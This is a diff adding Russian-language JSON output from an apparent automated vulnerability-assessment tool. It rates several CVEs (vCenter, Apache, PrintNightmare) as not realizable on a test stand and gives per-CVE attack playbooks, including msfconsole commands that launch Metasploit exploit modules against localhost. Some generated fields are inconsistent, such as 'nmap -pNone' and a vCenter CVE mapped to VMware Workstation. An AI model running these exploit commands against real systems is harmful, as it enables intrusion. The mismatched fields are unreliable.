+            "description": "Внедрение команд ОС через уязвимый ввод."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1190",
+            "name": "Exploit Public-Facing Application",
+            "tactic": "Initial Access",
+            "description": "Эксплуатация уязвимости публично доступного приложения для первичного доступа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "VMware vCenter Server 6.5/6.7/7.0",
+        "version_observed": "1.10",
+        "system_component": "VMware Workstation — демон аутентификации (vmware-authd)",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "BannerAnalyzer",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p902 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 902"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/linux/http/vmware_vcenter_vsan_health_rce; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/linux/http/vmware_vcenter_vsan_health_rce"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NMAP] Уязвимость протокола HTTP",
+      "attack_vector_id": "CVE-2011-3368",
+      "attack_type": "",
+      "severity": "HIGH",
+      "port": 8443,
+      "service": "",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "CVE-2011-3368 относится к «Apache HTTP Server 1.3/2.x», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "warn",
+          "evidence": "Порт 8443 виден атакующему, но не подтверждён инвентаризацией сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 8443 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "CVE-2011-3368 относится к «Apache HTTP Server 1.3/2.x», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2011-3368",
+            "name": "Apache HTTP Server mod_proxy Reverse Proxy Exposure",
+            "description": "Некорректная обработка запросов в mod_proxy (RewriteRule/ProxyPassMatch) позволяет проксировать запросы во внутреннюю сеть (SSRF-подобное поведение).",
+            "cvss": 5.0,
+            "cpe_affected": "Apache HTTP Server 1.3/2.x"
+          },
+          {
+            "id": "CVE-2007-6750",
+            "name": "Apache HTTP Server Slowloris Denial of Service",
+            "description": "Удержание частичных HTTP-заголовков исчерпывает пул соединений сервера (Slowloris), приводя к отказу в обслуживании.",
+            "cvss": 7.5,
+            "cpe_affected": "Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-441",
+            "name": "Unintended Proxy or Intermediary (Confused Deputy)",
+            "description": "Сервис проксирует запросы во внутреннюю сеть от имени злоумышленника."
+          },
+          {
+            "id": "CWE-400",
+            "name": "Uncontrolled Resource Consumption",
+            "description": "Неконтролируемое потребление ресурсов, ведущее к отказу в обслуживании."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-664",
+            "name": "Server Side Request Forgery",
+            "description": "Принуждение сервера к запросам во внутреннюю сеть."
+          },
+          {
+            "id": "CAPEC-469",
+            "name": "HTTP DoS",
+            "description": "Исчерпание ресурсов HTTP-сервера медленными/массовыми запросами."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1090",
+            "name": "Proxy",
+            "tactic": "Command and Control",
+            "description": "Использование промежуточного узла для проксирования трафика."
+          },
+          {
+            "id": "T1499",
+            "name": "Endpoint Denial of Service",
+            "tactic": "Impact",
+            "description": "Отказ в обслуживании конечного узла через исчерпание ресурсов."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Apache HTTP Server 1.3/2.x",
+        "version_observed": "",
+        "system_component": "HTTPS-сервис управления",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p8443 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 8443"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NMAP] Уязвимость протокола HTTP",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "OS-specific: CVE-2021-34527",
+      "attack_vector_id": "CVE-2021-34527",
+      "attack_type": "os_specific",
+      "severity": "HIGH",
+      "port": null,
+      "service": "",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2021-34527 (устранено июлем 2021; также требует включённой службы печати) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2021-34527 (устранено июлем 2021; также требует включённой службы печати) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2021-34527",
+            "name": "Windows Print Spooler Remote Code Execution (PrintNightmare)",
+            "description": "Некорректная проверка привилегий в службе печати позволяет удалённо выполнить код. Требует доступной службы Print Spooler.",
+            "cvss": 8.8,
+            "cpe_affected": "Microsoft Windows Print Spooler"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-269",
+            "name": "Improper Privilege Management",
+            "description": "Некорректное назначение/проверка привилегий, ведущее к их повышению."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-233",
+            "name": "Privilege Escalation",
+            "description": "Получение более высоких привилегий, чем предусмотрено."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1068",
+            "name": "Exploitation for Privilege Escalation",
+            "tactic": "Privilege Escalation",
+            "description": "Эксплуатация уязвимости для повышения привилегий в системе."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows Print Spooler",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/windows/dcerpc/cve_2021_1675_printnightmare"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NMAP] Уязвимость HTTP",
+      "attack_vector_id": "CVE-2011-3368",
+      "attack_type": "",
+      "severity": "HIGH",
+      "port": 8443,
+      "service": "",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "CVE-2011-3368 относится к «Apache HTTP Server 1.3/2.x», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "warn",
+          "evidence": "Порт 8443 виден атакующему, но не подтверждён инвентаризацией сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 8443 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "CVE-2011-3368 относится к «Apache HTTP Server 1.3/2.x», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2011-3368",
+            "name": "Apache HTTP Server mod_proxy Reverse Proxy Exposure",
+            "description": "Некорректная обработка запросов в mod_proxy (RewriteRule/ProxyPassMatch) позволяет проксировать запросы во внутреннюю сеть (SSRF-подобное поведение).",
+            "cvss": 5.0,
+            "cpe_affected": "Apache HTTP Server 1.3/2.x"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-441",
+            "name": "Unintended Proxy or Intermediary (Confused Deputy)",
+            "description": "Сервис проксирует запросы во внутреннюю сеть от имени злоумышленника."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-664",
+            "name": "Server Side Request Forgery",
+            "description": "Принуждение сервера к запросам во внутреннюю сеть."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1090",
+            "name": "Proxy",
+            "tactic": "Command and Control",
+            "description": "Использование промежуточного узла для проксирования трафика."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Apache HTTP Server 1.3/2.x",
+        "version_observed": "",
+        "system_component": "HTTPS-сервис управления",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p8443 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 8443"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NMAP] Уязвимость HTTP",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NMAP] Уязвимость HTTP",
+      "attack_vector_id": "CVE-2007-6750",
+      "attack_type": "",
+      "severity": "HIGH",
+      "port": 3580,
+      "service": "",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "CVE-2007-6750 относится к «Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 3580 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 3580 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "CVE-2007-6750 относится к «Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2007-6750",
+            "name": "Apache HTTP Server Slowloris Denial of Service",
+            "description": "Удержание частичных HTTP-заголовков исчерпывает пул соединений сервера (Slowloris), приводя к отказу в обслуживании.",
+            "cvss": 7.5,
+            "cpe_affected": "Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-400",
+            "name": "Uncontrolled Resource Consumption",
+            "description": "Неконтролируемое потребление ресурсов, ведущее к отказу в обслуживании."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-469",
+            "name": "HTTP DoS",
+            "description": "Исчерпание ресурсов HTTP-сервера медленными/массовыми запросами."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1499",
+            "name": "Endpoint Denial of Service",
+            "tactic": "Impact",
+            "description": "Отказ в обслуживании конечного узла через исчерпание ресурсов."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту 3580",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p3580 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 3580"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NMAP] Уязвимость HTTP",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NMAP] Уязвимость протокола HTTP",
+      "attack_vector_id": "CVE-2007-6750",
+      "attack_type": "",
+      "severity": "HIGH",
+      "port": 3580,
+      "service": "",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "CVE-2007-6750 относится к «Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 3580 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту 3580 напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "CVE-2007-6750 относится к «Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2007-6750",
+            "name": "Apache HTTP Server Slowloris Denial of Service",
+            "description": "Удержание частичных HTTP-заголовков исчерпывает пул соединений сервера (Slowloris), приводя к отказу в обслуживании.",
+            "cvss": 7.5,
+            "cpe_affected": "Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-400",
+            "name": "Uncontrolled Resource Consumption",
+            "description": "Неконтролируемое потребление ресурсов, ведущее к отказу в обслуживании."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-469",
+            "name": "HTTP DoS",
+            "description": "Исчерпание ресурсов HTTP-сервера медленными/массовыми запросами."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1499",
+            "name": "Endpoint Denial of Service",
+            "tactic": "Impact",
+            "description": "Отказ в обслуживании конечного узла через исчерпание ресурсов."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Apache HTTP Server (и иные HTTP-сервисы, удерживающие соединения)",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту 3580",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p3580 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 3580"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NMAP] Уязвимость протокола HTTP",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    }
+  ],
+  "trivy_summary": {
+    "total": 758,
+    "by_severity": {
+      "HIGH": 333,
+      "MEDIUM": 388,
+      "CRITICAL": 37
+    },
+    "exposed_on_reachable_service": 0,
+    "note": "Уязвимости пакетов из манифестов кода (Trivy) не имеют сетевого пути снаружи: веб-/БД-сервис, отдающий эти зависимости, на стенде не публикуется. В реализуемые не включены."
+  }
+}
